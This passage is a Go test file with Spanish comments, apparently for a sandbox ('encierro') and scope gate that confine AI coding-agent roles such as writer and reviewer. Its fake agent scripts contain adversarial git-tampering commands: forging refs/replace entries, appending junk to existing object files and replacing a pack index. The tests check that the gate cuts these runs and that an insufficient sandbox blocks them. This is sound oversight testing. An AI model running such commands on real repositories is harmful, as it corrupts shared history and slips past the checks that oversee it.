// Tests adversariales del spec .hoom/specs/contencion-del-writer.md sobre el
// sobre (agentcmd), en cualquier sistema: el nivel en el registro y el log
// (CA-674), la politica al empezar (CA-675, CA-676), git-ajeno (CA-685), el
// material de git ampliado (CA-686, CA-687), la config de los agentes
// (CA-689, CA-690) y el orden despues del run (CA-693). Los niveles
// esperados se calculan con encierro.Nivel (aclaracion 1); CLIs falsos y un
// provider falso con ConEstado (aclaracion 2); el $HOME y la config global
// de git son del test (aclaracion 3).
package agentcmd

import (
	"bytes"
	"compress/zlib"
	"crypto/sha1"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/hoomdev/hoomai/internal/encierro"
	"github.com/hoomdev/hoomai/internal/envelope"
	"github.com/hoomdev/hoomai/internal/finding"
	"github.com/hoomdev/hoomai/internal/providers"
	"github.com/hoomdev/hoomai/internal/runcmd"
	"github.com/hoomdev/hoomai/internal/taskcmd"
	"github.com/hoomdev/hoomai/internal/verdict"
)

// ---------------------------------------------------------------- fixtures

// cdwHome deja un $HOME del test (aclaracion 3) y la config de git aislada:
// GIT_CONFIG_GLOBAL en un archivo vacio del test, sin la del sistema.
func cdwHome(t *testing.T) string {
	t.Helper()
	qcLimpiarEntorno(t)
	home, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	global := filepath.Join(home, ".gitconfig-del-test")
	if err := os.WriteFile(global, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GIT_CONFIG_GLOBAL", global)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	t.Setenv("CODEX_HOME", "")
	os.Unsetenv("CODEX_HOME")
	return home
}

// cdwSinGlobal saca GIT_CONFIG_GLOBAL: git lee ~/.gitconfig y
// $XDG_CONFIG_HOME/git/config del $HOME del test.
func cdwSinGlobal(t *testing.T) {
	t.Helper()
	t.Setenv("GIT_CONFIG_GLOBAL", "")
	os.Unsetenv("GIT_CONFIG_GLOBAL")
}

// cdwProyecto es aeaProyecto (gate test barato, tarea demo abierta) con un
// $HOME del test y extra al final del hoom.yaml (la seccion encierro, por
// ejemplo), en el principal y en el arbol.
func cdwProyecto(t *testing.T, extra string) (root, wt string) {
	t.Helper()
	cdwHome(t)
	return aeaProyecto(t, "true", extra)
}

const cdwSeccion = "encierro:\n  exigir: no\n"

func cdwExigir(e string) string { return "encierro:\n  exigir: " + e + "\n" }

func cdwEscribir(t *testing.T, p, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func cdwExiste(p string) bool {
	_, err := os.Lstat(p)
	return err == nil
}

// el provider falso con ConEstado (CA-690) y uno sin ella.
const (
	cdwConEstadoNombre = "falso-cdw"
	cdwConEstadoBin    = "hoom-falso-cdw"
	cdwSinEstadoNombre = "sin-estado-cdw"
	cdwSinEstadoBin    = "hoom-sin-estado-cdw"
)

func cdwCapacidades() providers.Capabilities {
	return providers.Capabilities{Structured: true, SessionID: true, Model: true, SystemPrompt: true,
		Tools: true, ReadOnly: true, NoExec: true, Unattended: true, MaxTurns: true, Budget: true, Effort: true}
}

type cdwConEstado struct{}

func (cdwConEstado) Name() string                         { return cdwConEstadoNombre }
func (cdwConEstado) Bin() string                          { return cdwConEstadoBin }
func (cdwConEstado) Capabilities() providers.Capabilities { return cdwCapacidades() }
func (p cdwConEstado) Command(req providers.Request) (providers.Invocation, error) {
	return providers.Invocation{Bin: p.Bin(), Args: []string{req.Prompt}}, nil
}
func (cdwConEstado) Normalize(string) []providers.Event { return nil }
func (cdwConEstado) Estado() providers.Estado {
	return providers.Estado{
		Escribe: []string{"~/.falso-cdw/sesiones"},
		EnArbol: []string{"falso-cdw.json", ".falso-cdw/"},
		Corre: []providers.Corre{
			{Archivo: "~/.falso-cdw/config.json", Claves: []string{"hooks", "proyectos.*.mcp"}},
			{Archivo: "~/.falso-cdw/entero.toml"},
		},
	}
}

type cdwSinEstado struct{}

func (cdwSinEstado) Name() string                         { return cdwSinEstadoNombre }
func (cdwSinEstado) Bin() string                          { return cdwSinEstadoBin }
func (cdwSinEstado) Capabilities() providers.Capabilities { return cdwCapacidades() }
func (p cdwSinEstado) Command(req providers.Request) (providers.Invocation, error) {
	return providers.Invocation{Bin: p.Bin(), Args: []string{req.Prompt}}, nil
}
func (cdwSinEstado) Normalize(string) []providers.Event { return nil }

var (
	cdwRegistro        sync.Once
	cdwErrConEstado    error
	cdwErrSinEstado    error
	_                  providers.ConEstado = cdwConEstado{}
	cdwEstadoDelFalso                      = cdwConEstado{}.Estado()
	cdwNingunaInterfaz                     = func(p providers.Provider) bool { _, ok := p.(providers.ConEstado); return ok }
)

// cdwRegistrar deja los dos providers falsos en providers.Default una sola
// vez por binario (no hay Unregister). Sus binarios solo estan en el PATH
// del test que los pone, y no declaran Isolation: no cambian ni el provider
// por defecto ni la lista de los que pueden correr un rol ciego.
func cdwRegistrar(t *testing.T) {
	t.Helper()
	cdwRegistro.Do(func() {
		cdwErrConEstado = providers.Default.Register(cdwConEstado{})
		cdwErrSinEstado = providers.Default.Register(cdwSinEstado{})
	})
	if cdwErrConEstado != nil || cdwErrSinEstado != nil {
		t.Fatalf("CA-690: fixture: registrar los providers falsos: %v %v", cdwErrConEstado, cdwErrSinEstado)
	}
	if cdwNingunaInterfaz(cdwSinEstado{}) {
		t.Fatal("CA-690: fixture: el falso sin estado no implementa ConEstado")
	}
}

// cdwCorrer corre el sobre del rol con el CLI falso script. tarea "" corre
// sin --task. Provider "" es claude.
func cdwCorrer(t *testing.T, root, rol, tarea, script string, o Options) (Result, string) {
	t.Helper()
	bin := "claude"
	switch o.Provider {
	case "":
		o.Provider = "claude"
	case cdwConEstadoNombre:
		cdwRegistrar(t)
		bin = cdwConEstadoBin
	case cdwSinEstadoNombre:
		cdwRegistrar(t)
		bin = cdwSinEstadoBin
	case "claude":
	default:
		bin = o.Provider
	}
	fakeProvider(t, bin, script)
	o.Role, o.Task = rol, tarea
	if o.Prompt == "" {
		o.Prompt = "trabaja en la tarea demo"
	}
	var buf bytes.Buffer
	res, err := Run(root, "main", o, &buf)
	if err != nil {
		t.Fatalf("fixture: el sobre del %s corre: %v\n%s", rol, err, buf.String())
	}
	if res.EnvelopeID == "" {
		t.Fatalf("fixture: el sobre del %s tiene registro: %+v\n%s", rol, res, buf.String())
	}
	return res, buf.String()
}

func cdwProv(t *testing.T, n string) providers.Provider {
	t.Helper()
	p, err := providers.Lookup(n)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

// cdwClave es la clave encierro del registro crudo del sobre id.
func cdwClave(t *testing.T, root, id string) (map[string]any, bool) {
	t.Helper()
	m := aeaClaves(t, root, id)
	v, ok := m["encierro"]
	if !ok {
		return nil, false
	}
	mm, _ := v.(map[string]any)
	return mm, true
}

// cdwMetaCruda es el sidecar crudo del run id (en el principal o en el
// arbol).
func cdwMetaCruda(t *testing.T, id string, dirs ...string) map[string]any {
	t.Helper()
	for _, d := range dirs {
		raw, err := os.ReadFile(filepath.Join(d, ".hoom", "runs", id+".meta.json"))
		if err != nil {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal(raw, &m); err != nil {
			t.Fatalf("el sidecar %s es JSON: %v", id, err)
		}
		return m
	}
	t.Fatalf("el sidecar del run %s esta en .hoom/runs/ de %v", id, dirs)
	return nil
}

// cdwExigeInfo exige que la clave cruda got sea la Info want, con las
// reglas del JSON (falta [] con completo, motivo ausente con completo; el
// mecanismo con ninguno no se fija, aclaracion 7).
func cdwExigeInfo(t *testing.T, ca, que string, got map[string]any, want encierro.Info) {
	t.Helper()
	if got == nil {
		t.Fatalf("%s: %s: lleva la clave encierro (%+v)", ca, que, want)
	}
	if got["nivel"] != want.Nivel {
		t.Fatalf("%s: %s: nivel %q; quiero %q (%v)", ca, que, got["nivel"], want.Nivel, got)
	}
	falta, ok := got["falta"].([]any)
	if !ok {
		t.Fatalf("%s: %s: falta es una lista (nunca null): %v", ca, que, got)
	}
	var fs []string
	for _, f := range falta {
		s, _ := f.(string)
		fs = append(fs, s)
	}
	if !(len(fs) == 0 && len(want.Falta) == 0) && !reflect.DeepEqual(fs, want.Falta) {
		t.Fatalf("%s: %s: falta %q; quiero %q", ca, que, fs, want.Falta)
	}
	motivo, hay := got["motivo"]
	if want.Motivo == "" && hay {
		t.Fatalf("%s: %s: con completo motivo no va: %v", ca, que, got)
	}
	if want.Motivo != "" && motivo != want.Motivo {
		t.Fatalf("%s: %s: motivo %q; quiero %q", ca, que, motivo, want.Motivo)
	}
	if want.Nivel != encierro.NivelNinguno && got["mecanismo"] != want.Mecanismo {
		t.Fatalf("%s: %s: mecanismo %q; quiero %q", ca, que, got["mecanismo"], want.Mecanismo)
	}
}

// cdwCortado exige el corte de una regla nueva (git-ajeno, config-de-agentes)
// en el sobre del rol: scope, no-entregable, exit 1, sin verify ni veredicto,
// la nota, la violacion en ruta con su detalle y su hallazgo high del gate.
func cdwCortado(t *testing.T, ca, caso, root, wt string, res Result, out string, antes int, regla, nota, detalle, ruta, rol string) finding.Finding {
	t.Helper()
	if res.Stage != "scope" || res.Status != envelope.StatusNotDeliverable || res.ExitCode != 1 || !res.Scope.Cuts() {
		t.Fatalf("%s: %s: el sobre del %s cierra en scope, no-entregable, exit 1: %+v\n%s", ca, caso, rol, res, out)
	}
	if res.VerdictID != "" || res.Check != nil || aeaVeredictos(root, wt) != antes {
		t.Fatalf("%s: %s: sin verify ni veredicto nuevo: %+v (veredictos %d -> %d)", ca, caso, res, antes, aeaVeredictos(root, wt))
	}
	if res.Note != nota {
		t.Fatalf("%s: %s: la nota es %q; fue %q", ca, caso, nota, res.Note)
	}
	if r := aeaRegistro(t, root, res.EnvelopeID); r.Note != nota || r.Stage != "scope" || r.Status != envelope.StatusNotDeliverable {
		t.Fatalf("%s: %s: el registro dice lo mismo: %+v", ca, caso, r)
	}
	v, ok := aeaViolacion(res.Scope, regla, ruta)
	if !ok || v.Detail != detalle || v.FindingID == "" {
		t.Fatalf("%s: %s: violacion %s en %s con su detalle y su hallazgo: %+v", ca, caso, regla, ruta, res.Scope.Violations)
	}
	f, ok := aeaHallazgo(t, v.FindingID, wt, root)
	if !ok {
		t.Fatalf("%s: %s: el hallazgo %s del gate quedo en disco", ca, caso, v.FindingID)
	}
	if f.Severity != "high" || f.Author != AutorGateDeScope || f.Description != DescripcionViolacion(v, rol) {
		t.Fatalf("%s: %s: el hallazgo es high, de %q, con %q: %+v", ca, caso, AutorGateDeScope, DescripcionViolacion(v, rol), f)
	}
	want := regla + ": el rol " + rol + " escribio " + ruta + " - " + detalle
	if DescripcionViolacion(v, rol) != want {
		t.Fatalf("%s: %s: DescripcionViolacion es %q; fue %q", ca, caso, want, DescripcionViolacion(v, rol))
	}
	return f
}

func cdwComun(t *testing.T, wt string) string { return ar6Ruta(t, wt, "--git-common-dir") }

// cdwRolesQueEjecutan son los roles que ejecutan que corre el sobre.
var cdwRolesQueEjecutan = []string{"writer", "test-writer", "characterizer", "refutador", "orquestador", "reviewer"}

// cdwPasos son los pasos de siempre del sobre del rol.
func cdwPasos(rol string) int {
	if rol == "test-writer" {
		return 6
	}
	return 5
}

// ---------------------------------------------------------------- CA-674

// CA-674: el registro del sobre de cada rol que ejecuta y el sidecar de su
// run llevan encierro con el nivel de este sistema (encierro.Nivel), y el log
// trae la linea del encierro y, debajo de completo, el aviso con el rol.
func TestCA674_CadaRolQueEjecutaLlevaElNivel(t *testing.T) {
	const ca = "CA-674"
	for _, rol := range cdwRolesQueEjecutan {
		root, wt := cdwProyecto(t, cdwSeccion)
		want := encierro.Nivel(true, cdwProv(t, "claude"))
		script := "exit 0\n"
		if rol == "test-writer" {
			script = aeaEscribeTW
		}
		res, out := cdwCorrer(t, root, rol, aeaTarea, script, Options{})
		if res.RunID == "" {
			t.Fatalf("%s: %s: fixture: el run corrio: %+v\n%s", ca, rol, res, out)
		}
		got, _ := cdwClave(t, root, res.EnvelopeID)
		cdwExigeInfo(t, ca, rol+": el registro del sobre", got, want)
		if r := aeaRegistro(t, root, res.EnvelopeID); r.Encierro == nil || r.Encierro.Nivel != want.Nivel {
			t.Fatalf("%s: %s: envelope.Record.Encierro: %+v", ca, rol, r.Encierro)
		}
		meta := cdwMetaCruda(t, res.RunID, root, wt)
		mm, _ := meta["encierro"].(map[string]any)
		cdwExigeInfo(t, ca, rol+": el sidecar del run", mm, want)
		if !strings.Contains(out, encierro.Linea(want)) {
			t.Fatalf("%s: %s: el log trae %q:\n%s", ca, rol, encierro.Linea(want), out)
		}
		if want.Nivel == encierro.NivelCompleto && strings.Contains(out, "aviso: encierro") {
			t.Fatalf("%s: %s: con completo no hay aviso:\n%s", ca, rol, out)
		}
		if want.Nivel != encierro.NivelCompleto && !strings.Contains(out, encierro.Aviso(want, rol)) {
			t.Fatalf("%s: %s: debajo de completo el log trae %q:\n%s", ca, rol, encierro.Aviso(want, rol), out)
		}
	}
}

// CA-674 y CA-677: con la sonda reemplazada (parcial en una maquina con
// completo), el registro y el log dicen ese nivel, con el aviso del rol.
func TestCA674_ConNivelParcialElLogTraeElAviso(t *testing.T) {
	const ca = "CA-674"
	restaurar := encierro.ReemplazarSonda(encierro.Sonda{Bwrap: true, Espacio: true, LandlockABI: 5})
	defer restaurar()
	root, _ := cdwProyecto(t, cdwSeccion)
	want := encierro.Nivel(true, cdwProv(t, "claude"))
	res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+"exit 0\n", Options{})
	got, _ := cdwClave(t, root, res.EnvelopeID)
	cdwExigeInfo(t, ca, "el registro con la sonda reemplazada", got, want)
	if want.Nivel == encierro.NivelCompleto {
		t.Fatalf("%s: fixture: con ABI 5 el nivel no es completo: %+v", ca, want)
	}
	if !strings.Contains(out, encierro.Aviso(want, "writer")) || !strings.Contains(out, encierro.Linea(want)) {
		t.Fatalf("%s: el log trae la linea %q y el aviso %q:\n%s", ca, encierro.Linea(want), encierro.Aviso(want, "writer"), out)
	}
}

// CA-674: sin la seccion, ni el registro ni el sidecar llevan la clave, y el
// log no dice nada del encierro.
func TestCA674_SinLaSeccionNoHayClave(t *testing.T) {
	const ca = "CA-674"
	root, wt := cdwProyecto(t, "")
	res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+"exit 0\n", Options{})
	if _, hay := cdwClave(t, root, res.EnvelopeID); hay {
		t.Fatalf("%s: sin la seccion el registro no lleva encierro: %v", ca, aeaClaves(t, root, res.EnvelopeID))
	}
	if r := aeaRegistro(t, root, res.EnvelopeID); r.Encierro != nil {
		t.Fatalf("%s: Record.Encierro nil sin la seccion: %+v", ca, r.Encierro)
	}
	if res.RunID != "" {
		if _, hay := cdwMetaCruda(t, res.RunID, root, wt)["encierro"]; hay {
			t.Fatalf("%s: sin la seccion el sidecar no lleva encierro", ca)
		}
	}
	for _, l := range []string{"sin encierro:", "encierro completo con", "encierro parcial con", "aviso: encierro"} {
		if strings.Contains(out, l) {
			t.Fatalf("%s: sin la seccion el log no dice %q:\n%s", ca, l, out)
		}
	}
}

// CA-674: el sobre de un rol que no ejecuta (scout) no lleva la clave, aunque
// el proyecto tenga la seccion.
func TestCA674_UnRolQueNoEjecutaNoLlevaLaClave(t *testing.T) {
	const ca = "CA-674"
	root, _ := cdwProyecto(t, cdwSeccion)
	res, _ := cdwCorrer(t, root, "scout", aeaTarea, "exit 0\n", Options{Prompt: "explora"})
	if m, hay := cdwClave(t, root, res.EnvelopeID); hay {
		t.Fatalf("%s: el sobre del scout no lleva encierro: %v", ca, m)
	}
}

// CA-674, CA-677 y caso limite "un rol que ejecuta sin --task": nivel
// ninguno con el motivo `sin tarea`, en el registro y en el log, con el aviso.
func TestCA674_SinTareaEsNingunoSinTarea(t *testing.T) {
	const ca = "CA-674"
	root, _ := cdwProyecto(t, cdwSeccion)
	res, out := cdwCorrer(t, root, "writer", "", "exit 0\n", Options{})
	want := encierro.Info{Nivel: encierro.NivelNinguno, Falta: []string{encierro.FaltaProcesos, encierro.FaltaEscrituras, encierro.FaltaIPC}, Motivo: encierro.MotivoSinTarea}
	got, _ := cdwClave(t, root, res.EnvelopeID)
	cdwExigeInfo(t, ca, "el writer sin --task", got, want)
	if !strings.Contains(out, "sin encierro: sin tarea") || !strings.Contains(out, encierro.Aviso(want, "writer")) {
		t.Fatalf("%s: el log dice `sin encierro: sin tarea` y el aviso:\n%s", ca, out)
	}
}

// ---------------------------------------------------------------- CA-676

// CA-676: con un nivel menor que exigir, el sobre de cada rol que ejecuta se
// niega dentro del paso run: exit 1, la nota del contrato, sin run, sin
// veredicto nuevo, con los pasos de siempre, sin lanzar al CLI, y el registro
// lleva su encierro. Con exigir no, corre con el nivel que haya.
func TestCA676_ConUnNivelMenorQueExigirElSobreSeNiega(t *testing.T) {
	const ca = "CA-676"
	restaurar := encierro.ReemplazarSonda(encierro.Sonda{}) // linux sin bwrap: ninguno
	defer restaurar()
	for _, c := range []struct{ rol, exigir string }{
		{"writer", "completo"}, {"writer", "parcial"}, {"test-writer", "parcial"}, {"characterizer", "completo"},
		{"refutador", "parcial"}, {"orquestador", "parcial"}, {"reviewer", "completo"},
	} {
		root, wt := cdwProyecto(t, cdwExigir(c.exigir))
		info := encierro.Nivel(true, cdwProv(t, "claude"))
		if encierro.Alcanza(info.Nivel, c.exigir) {
			t.Fatalf("%s: fixture: sin bwrap el nivel no alcanza %s: %+v", ca, c.exigir, info)
		}
		marca := filepath.Join(t.TempDir(), "corrio")
		antesRuns, antesV := runsCount(t, root)+runsCount(t, wt), aeaVeredictos(root, wt)
		res, out := cdwCorrer(t, root, c.rol, aeaTarea, ": > '"+marca+"'\nexit 0\n", Options{})
		nota := encierro.NotaExigir(info, c.exigir, c.rol)
		if res.Stage != "run" || res.ExitCode != 1 || res.Note != nota || res.RunID != "" {
			t.Fatalf("%s: %s exige %s: el sobre cierra en run, exit 1, con %q y sin run: %+v\n%s", ca, c.rol, c.exigir, nota, res, out)
		}
		if res.Status == envelope.StatusDeliverable {
			t.Fatalf("%s: %s: un sobre que se nego no es entregable: %+v", ca, c.rol, res)
		}
		if cdwExiste(marca) {
			t.Fatalf("%s: %s: el CLI no corre", ca, c.rol)
		}
		if n := runsCount(t, root) + runsCount(t, wt); n != antesRuns {
			t.Fatalf("%s: %s: ningun run en .hoom/runs/: %d -> %d", ca, c.rol, antesRuns, n)
		}
		if n := aeaVeredictos(root, wt); n != antesV {
			t.Fatalf("%s: %s: sin veredicto nuevo: %d -> %d", ca, c.rol, antesV, n)
		}
		r := aeaRegistro(t, root, res.EnvelopeID)
		if r.Steps != cdwPasos(c.rol) || r.Stage != "run" || r.Note != nota {
			t.Fatalf("%s: %s: el registro tiene los pasos de siempre (%d) y cierra en run con la nota: %+v", ca, c.rol, cdwPasos(c.rol), r)
		}
		got, _ := cdwClave(t, root, res.EnvelopeID)
		cdwExigeInfo(t, ca, c.rol+" que se nego", got, info)
	}
}

// CA-676: el nivel contra exigir para cada sonda: corre si alcanza y se niega
// si no; con exigir no corre siempre.
func TestCA676_ExigirContraCadaNivel(t *testing.T) {
	const ca = "CA-676"
	for _, s := range []encierro.Sonda{{Bwrap: true, Espacio: true, LandlockABI: 5}, {Bwrap: true, Espacio: true, LandlockABI: 6}, {Bwrap: true, Salida: "denegado"}} {
		for _, exigir := range []string{"no", "parcial", "completo"} {
			func() {
				restaurar := encierro.ReemplazarSonda(s)
				defer restaurar()
				root, _ := cdwProyecto(t, cdwExigir(exigir))
				info := encierro.Nivel(true, cdwProv(t, "claude"))
				marca := filepath.Join(t.TempDir(), "corrio")
				res, out := cdwCorrer(t, root, "writer", aeaTarea, ": > '"+marca+"'\n"+ar1Codigo+"exit 0\n", Options{})
				if encierro.Alcanza(info.Nivel, exigir) {
					// (el CLI puede correr encerrado: la marca de afuera no cuenta)
					if res.RunID == "" || res.Stage == "run" || res.Note == encierro.NotaExigir(info, exigir, "writer") {
						t.Fatalf("%s: nivel %s con exigir %s corre: %+v\n%s", ca, info.Nivel, exigir, res, out)
					}
				} else if res.Stage != "run" || res.ExitCode != 1 || res.RunID != "" || res.Note != encierro.NotaExigir(info, exigir, "writer") || cdwExiste(marca) {
					t.Fatalf("%s: nivel %s con exigir %s se niega: %+v\n%s", ca, info.Nivel, exigir, res, out)
				}
			}()
		}
	}
}

// CA-676 y caso limite: un rol que ejecuta sin --task, con exigir, no corre.
func TestCA676_SinTareaConExigirNoCorre(t *testing.T) {
	const ca = "CA-676"
	root, _ := cdwProyecto(t, cdwExigir("parcial"))
	marca := filepath.Join(t.TempDir(), "corrio")
	res, out := cdwCorrer(t, root, "writer", "", ": > '"+marca+"'\nexit 0\n", Options{})
	info := encierro.Info{Nivel: encierro.NivelNinguno, Falta: []string{encierro.FaltaProcesos, encierro.FaltaEscrituras, encierro.FaltaIPC}, Motivo: encierro.MotivoSinTarea}
	want := "el encierro de este sistema es ninguno (falta: procesos, escrituras, ipc) y hoom.yaml exige parcial: el writer no corre"
	if encierro.NotaExigir(info, "parcial", "writer") != want || res.Note != want || res.ExitCode != 1 || res.Stage != "run" || cdwExiste(marca) {
		t.Fatalf("%s: sin --task y con exigir parcial el writer no corre: %+v\n%s", ca, res, out)
	}
}

// ---------------------------------------------------------------- CA-675

// cdwReescribirYAML reemplaza el hoom.yaml del checkout principal (el que lee
// LoadRoles) despues de abrir la tarea: el del arbol queda como estaba.
func cdwReescribirYAML(t *testing.T, root, body string) {
	t.Helper()
	write(t, root, "hoom.yaml", body)
	git(t, root, "add", "hoom.yaml")
	git(t, root, "commit", "-q", "-m", "hoom.yaml del principal")
}

// CA-675: al empezar el sobre, una escribible que contiene o esta dentro del
// checkout principal o del directorio comun, o un gate de gates_sin_encierro
// que no esta en los gates del arbol (aunque si en los del principal),
// cierra el sobre en run con exit 1 y su texto, sin run.
func TestCA675_LaPoliticaSeValidaAlEmpezarElSobre(t *testing.T) {
	const ca = "CA-675"
	base := "schema: hoom/v1\nproject: demo\nbase_branch: main\ngates:\n  test:\n    required: true\n    cmd: \"true\"\n"
	for _, c := range []struct {
		nombre string
		yaml   func(root string) string
		nota   func(root string) string
	}{
		{"una escribible dentro del principal",
			func(root string) string {
				return base + "encierro:\n  escribibles:\n    - " + filepath.Join(root, ".hoom", "items") + "\n"
			},
			func(root string) string {
				return "encierro: escribibles: " + filepath.Join(root, ".hoom", "items") + " contiene o esta dentro del checkout principal o del directorio comun de git: no puede ser escribible"
			}},
		{"una escribible que contiene al principal",
			func(root string) string {
				return base + "encierro:\n  escribibles:\n    - " + filepath.Dir(root) + "\n"
			},
			func(root string) string {
				return "encierro: escribibles: " + filepath.Dir(root) + " contiene o esta dentro del checkout principal o del directorio comun de git: no puede ser escribible"
			}},
		{"una escribible dentro del directorio comun",
			func(root string) string {
				return base + "encierro:\n  escribibles:\n    - " + filepath.Join(root, ".git", "objects") + "\n"
			},
			func(root string) string {
				return "encierro: escribibles: " + filepath.Join(root, ".git", "objects") + " contiene o esta dentro del checkout principal o del directorio comun de git: no puede ser escribible"
			}},
		{"un gate que esta en el principal y no en el arbol",
			func(root string) string {
				return base + "  e2e:\n    required: false\n    cmd: \"true\"\nencierro:\n  gates_sin_encierro:\n    - e2e\n"
			},
			func(string) string {
				return "encierro: gates_sin_encierro: el gate e2e no esta en los gates de este arbol"
			}},
	} {
		root, wt := cdwProyecto(t, "")
		cdwReescribirYAML(t, root, c.yaml(root))
		marca := filepath.Join(t.TempDir(), "corrio")
		antes := runsCount(t, root) + runsCount(t, wt)
		res, out := cdwCorrer(t, root, "writer", aeaTarea, ": > '"+marca+"'\nexit 0\n", Options{})
		if res.Stage != "run" || res.ExitCode != 1 || res.Note != c.nota(root) || res.RunID != "" || cdwExiste(marca) {
			t.Fatalf("%s: %s: el sobre cierra en run, exit 1, con %q, sin run: %+v\n%s", ca, c.nombre, c.nota(root), res, out)
		}
		if n := runsCount(t, root) + runsCount(t, wt); n != antes {
			t.Fatalf("%s: %s: ningun run: %d -> %d", ca, c.nombre, antes, n)
		}
	}
	// control: el gate que si esta en el arbol, y una escribible ajena, corren
	root, _ := cdwProyecto(t, "encierro:\n  escribibles:\n    - "+t.TempDir()+"\n  gates_sin_encierro:\n    - test\n")
	res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+"exit 0\n", Options{})
	if res.RunID == "" || res.Stage == "run" {
		t.Fatalf("%s: control: una politica valida deja correr el sobre: %+v\n%s", ca, res, out)
	}
}

// ---------------------------------------------------------------- CA-685

// cdwObjeto escribe a mano un objeto suelto (blob) en el directorio comun y
// devuelve su sha y su ruta: sin correr git.
func cdwObjeto(t *testing.T, comun, data string) (string, string) {
	t.Helper()
	crudo := []byte(fmt.Sprintf("blob %d\x00%s", len(data), data))
	sum := sha1.Sum(crudo)
	sha := hex.EncodeToString(sum[:])
	var z bytes.Buffer
	w := zlib.NewWriter(&z)
	if _, err := w.Write(crudo); err != nil {
		t.Fatal(err)
	}
	w.Close()
	p := filepath.Join(comun, "objects", sha[:2], sha[2:])
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if !cdwExiste(p) {
		if err := os.WriteFile(p, z.Bytes(), 0o444); err != nil {
			t.Fatal(err)
		}
	}
	return sha, p
}

func cdwGitOut(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := ar1GitOut(t, dir, args...)
	if err != nil {
		t.Fatalf("git %v: %v", args, err)
	}
	return strings.TrimSpace(out)
}

// CA-685: una ref bajo refs/replace/ creada (suelta o empaquetada), movida o
// borrada, o un objeto suelto o un indice de pack que ya existia y sigue con
// otro contenido, corta el sobre del rol con la nota que lo nombra, el
// detalle del contrato y un hallazgo high; vale igual sin encierro y
// agents.<rol>.write no la levanta.
func TestCA685_GitAjenoCortaElSobre(t *testing.T) {
	const ca = "CA-685"
	const permiteTodo = "agents:\n  writer:\n    write:\n      allow: [\"**\"]\n"
	for _, c := range []struct {
		nombre, rol, extra string
		// antes prepara el repo y devuelve el script del CLI y la ruta que
		// tiene que nombrar la violacion
		antes func(t *testing.T, root, wt, comun string) (script, ruta string)
	}{
		{nombre: "crea una ref de reemplazo suelta", rol: "writer",
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				a, _ := cdwObjeto(t, comun, "objeto a")
				b, _ := cdwObjeto(t, comun, "objeto b")
				return "git replace -f " + a + " " + b + "\n", filepath.Join(comun, "refs", "replace", a)
			}},
		{nombre: "crea una ref de reemplazo y la empaqueta", rol: "characterizer",
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				a, _ := cdwObjeto(t, comun, "objeto a2")
				b, _ := cdwObjeto(t, comun, "objeto b2")
				return "git update-ref refs/replace/" + a + " " + b + "\ngit pack-refs --all --prune\n", filepath.Join(comun, "refs", "replace", a)
			}},
		{nombre: "mueve una ref de reemplazo que existia", rol: "writer", extra: permiteTodo,
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				a, _ := cdwObjeto(t, comun, "objeto a3")
				b, _ := cdwObjeto(t, comun, "objeto b3")
				c, _ := cdwObjeto(t, comun, "objeto c3")
				git(t, root, "update-ref", "refs/replace/"+a, b)
				return "git update-ref refs/replace/" + a + " " + c + "\n", filepath.Join(comun, "refs", "replace", a)
			}},
		{nombre: "borra una ref de reemplazo empaquetada que existia", rol: "refutador",
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				a, _ := cdwObjeto(t, comun, "objeto a4")
				b, _ := cdwObjeto(t, comun, "objeto b4")
				git(t, root, "update-ref", "refs/replace/"+a, b)
				git(t, root, "pack-refs", "--all", "--prune")
				return "git update-ref -d refs/replace/" + a + "\n", filepath.Join(comun, "refs", "replace", a)
			}},
		{nombre: "reescribe un objeto suelto que existia", rol: "writer",
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				_, p := cdwObjeto(t, comun, "un blob que nadie referencia")
				return "chmod u+w '" + p + "'\nprintf 'basura' >> '" + p + "'\n", p
			}},
		{nombre: "reescribe el indice de un pack que existia", rol: "orquestador",
			antes: func(t *testing.T, root, wt, comun string) (string, string) {
				git(t, root, "repack", "-a", "-d", "-q")
				idx, _ := filepath.Glob(filepath.Join(comun, "objects", "pack", "pack-*.idx"))
				if len(idx) != 1 {
					t.Fatalf("fixture: un pack con su indice: %q", idx)
				}
				pack := strings.TrimSuffix(idx[0], ".idx") + ".pack"
				nuevo := filepath.Join(t.TempDir(), "nuevo.idx")
				return "git -c pack.writeReverseIndex=false index-pack --index-version=1 -o '" + nuevo + "' '" + pack + "'\nmv -f '" + nuevo + "' '" + idx[0] + "'\n", idx[0]
			}},
	} {
		root, wt := cdwProyecto(t, c.extra)
		comun := cdwComun(t, wt)
		script, ruta := c.antes(t, root, wt, comun)
		antes := aeaVeredictos(root, wt)
		if c.rol == "writer" {
			script = ar1Codigo + script
		}
		res, out := cdwCorrer(t, root, c.rol, aeaTarea, script+"exit 0\n", Options{})
		f := cdwCortado(t, ca, c.nombre, root, wt, res, out, antes, RuleGitAjeno, NotaGitAjeno(c.rol), DetalleGitAjeno, ruta, c.rol)
		if !DeGitAjeno(f, c.rol) || DeMaterialDeGit(f, c.rol) || DeConfigDeAgentes(f, c.rol) {
			t.Fatalf("%s: %s: DeGitAjeno reconoce el hallazgo, y solo el: %+v", ca, c.nombre, f)
		}
		if NotaGitAjeno(c.rol) != "el "+c.rol+" cambio git fuera de la rama de su tarea: no se emite veredicto sobre este arbol" {
